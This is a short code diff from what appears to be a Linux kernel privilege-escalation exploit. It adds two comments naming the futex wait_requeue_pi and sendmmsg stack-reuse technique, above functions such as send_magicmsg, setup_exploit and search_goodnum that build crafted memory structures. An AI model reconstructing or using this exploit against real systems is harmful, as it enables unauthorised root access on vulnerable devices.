@@ -454,7 +454,7 @@ int make_socket() {
 
     return sockfd;
 }
-
+//wait_requeue_pi, reuse of stack with syscall sendmmsg
 void *send_magicmsg(void *arg) {
     int sockfd;
     struct mmsghdr msgvec[1];
@@ -527,7 +527,7 @@ static inline setup_exploit(unsigned long mem)
     *((unsigned long *)(mem + 0x24)) = mem;
     *((unsigned long *)(mem + 0x2c)) = mem + 8;
 }
-
+//requeue, release, requeuw.
 void *search_goodnum(void *arg) {
     int ret;
     char filename[256];
